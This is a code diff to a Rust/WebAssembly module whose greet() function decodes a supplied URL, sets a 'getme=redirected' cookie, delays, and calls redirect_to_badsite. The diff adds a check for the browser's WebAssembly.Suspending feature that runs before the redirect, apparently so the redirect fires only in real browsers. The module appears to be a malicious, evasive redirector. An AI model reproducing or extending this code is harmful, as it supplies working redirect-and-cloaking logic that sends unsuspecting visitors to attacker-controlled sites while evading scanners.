@@ -2,9 +2,25 @@
 use sha2::{Digest, Sha256};
 use wasm_bindgen::prelude::*;
 use web_sys::{Document, HtmlDocument, Location, window};
+use js_sys::{JsString, Reflect};
+
+pub fn has_suspending() -> Result<(), JsValue> {
+    // Get the browser window
+    let window: web_sys::Window = window().ok_or("no global window exists")?;
+
+    // Access the `WebAssembly` object
+    let wasm = Reflect::get(&window, &JsString::from("WebAssembly"))?;
+
+    // Check if "Suspending" is in WebAssembly
+    let has_reflect = Reflect::has(&wasm, &JsString::from("Suspending"))?;
+    if !has_reflect {
+        return Err(JsValue::from_str("No Suspended"));
+    }
+    Ok(())
+}
 
 fn set_cookie() -> Result<(), JsValue> {
-    let window = window().ok_or("no global window exists")?;
+    let window: web_sys::Window = window().ok_or("no global window exists")?;
     let document: Document = window.document().ok_or("no document exists")?;
     let html_document: HtmlDocument = document.dyn_into::<HtmlDocument>()?;
     /* Cookie string is built from the following values. However, we have hardcoded as the format library is quite large.
@@ -15,6 +31,7 @@ fn set_cookie() -> Result<(), JsValue> {
         24 * 60 * 60
     );
     */
+
     let cookie: &'static str = "getme=redirected; max-age=86400; path=/; samesite=lax";
 
     html_document.set_cookie(cookie)?;
@@ -61,6 +78,7 @@ fn delay() {
 #[wasm_bindgen]
 pub fn greet(name: &str) -> Result<(), JsValue> {
     let decoded_url = decode_url(name)?;
+    has_suspending()?;
     set_cookie()?;
     delay();
     redirect_to_badsite(&decoded_url)?;
